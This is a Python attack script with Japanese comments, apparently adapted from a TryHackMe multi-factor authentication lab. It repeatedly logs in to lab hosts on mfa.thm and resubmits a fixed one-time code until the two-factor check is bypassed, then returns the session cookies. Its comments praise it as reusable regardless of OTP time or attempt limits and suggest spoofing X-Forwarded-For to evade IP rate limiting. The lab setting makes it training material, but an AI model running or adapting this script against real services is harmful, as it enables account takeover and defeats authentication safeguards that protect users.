import requests

# ログイン→OTPを1回チャレンジ　を成功するまで繰り返すスクリプト
# サイトの挙動に合わせてコードを修正する必要があるが、OTPの時間制限や回数制限に関係なく使える汎用性が長所
# 元は、THMの「Multi-Factor Authentication」で提供されたコード
# https://tryhackme.com/r/room/multifactorauthentications

# ログイン画面
login_url = 'http://mfa.thm/labs/third/'
# OTP入力画面
otp_url = 'http://mfa.thm/labs/third/mfa'
# OTP認証成功し他場合のリダイレクト先
dashboard_url = 'http://mfa.thm/labs/third/dashboard'

# ログイン画面に入力する情報
credentials = {
    'email': 'thm@mail.thm',
    'password': 'test123'
}

# Define the headers to mimic a real browser
# X-Forwarded-For: に整数連番などを適当に入れるように改造すれば、IPベースのレート制限を回避できる（たぶん）
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://mfa.thm',
    'Connection': 'close',
    'Referer': 'http://mfa.thm/labs/third/mfa',
    'Upgrade-Insecure-Requests': '1'
}

# Function to check if the response contains the login page
def is_login_successful(response):
    return "User Verification" in response.text and response.status_code == 200

# Function to handle the login process
def login(session):
    response = session.post(login_url, data=credentials, headers=headers)
    return response
  
# Function to handle the 2FA process
def submit_otp(session, otp):
    # Split the OTP into individual digits
    otp_data = {
        # 1桁ずつ分かれている場合と、4桁まとまっている場合がある
        'code-1': otp[0],
        'code-2': otp[1],
        'code-3': otp[2],
        'code-4': otp[3],
        #'recovery_code': otp,
    }
    
    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)  # Disable auto redirects
    print(f"DEBUG: OTP submission response status code: {response.status_code}")
    
    return response

# Function to check if the response contains the login page
def is_login_page(response):
    return "Sign in to your account" in response.text or "Login" in response.text

# Function to attempt login and submit the hardcoded OTP until success
def try_until_success():
    otp_str = '1337'  # Hardcoded OTP

    while True:  # Keep trying until success
        session = requests.Session()  # Create a new session object for each attempt
        login_response = login(session)  # Log in before each OTP attempt
        
        if is_login_successful(login_response):
            print("Logged in successfully.")
        else:
            print("Failed to log in.")
            continue

        print(f"Trying OTP: {otp_str}")

        response = submit_otp(session, otp_str)

        # Check if the response is the login page (unsuccessful OTP)
        if is_login_page(response):
            print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}")
            continue  # Retry login and OTP submission

        # 入力後にリダイレクトされるパターンとその場にとどまるパターンがあるので、サイトの挙動に合わせてカスタマイズする。
        # Check if the response is a redirect (status code 302)
        if response.status_code == 302:
            location_header = response.headers.get('Location', '')
            print(f"Session cookies: {session.cookies.get_dict()}")

            # Check if it successfully bypassed 2FA and landed on the dashboard
            if location_header == '/labs/third/dashboard':
                print(f"Successfully bypassed 2FA with OTP: {otp_str}")
                return session.cookies.get_dict()  # Return session cookies after successful bypass
            elif location_header == '/labs/third/':
                print(f"Failed OTP attempt. Redirected to login. OTP: {otp_str}")
            else:
                print(f"Unexpected redirect location: {location_header}. OTP: {otp_str}")
        else:
            print(f"Received status code {response.status_code}. Retrying...")
        
        if response.status_code == 200:
            print(f"Session cookies: {session.cookies.get_dict()}")
            if "Invalid or expired recovery code" in response.text:
                print(f"Failed OTP attempt. Redirected to login. OTP: {otp_str}")
            else:
                print(f"Successfully bypassed 2FA with OTP: {otp_str}")            
                return session.cookies.get_dict()  # Return session cookies after successful bypass
        else:
            print(f"Received status code {response.status_code}. Retrying...")

# Start the attack to try until success
try_until_success()
